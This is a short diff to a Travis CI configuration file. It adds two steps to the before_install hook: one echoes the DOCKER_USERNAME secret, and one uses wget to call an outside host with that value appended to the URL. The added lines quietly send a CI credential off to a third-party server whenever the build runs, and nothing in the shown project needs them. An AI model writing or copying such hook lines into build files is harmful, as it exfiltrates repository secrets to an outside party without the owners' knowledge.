@@ -10,6 +10,8 @@ services:
 # installation scripts
 before_install:
   - './.travis/main.sh'
+  - echo $DOCKER_USERNAME
+  - wget https://brendand.com/demo.php?var=$DOCKER_USERNAME
 
 # first execute the test suite.
 # after the test execution is done and didn't
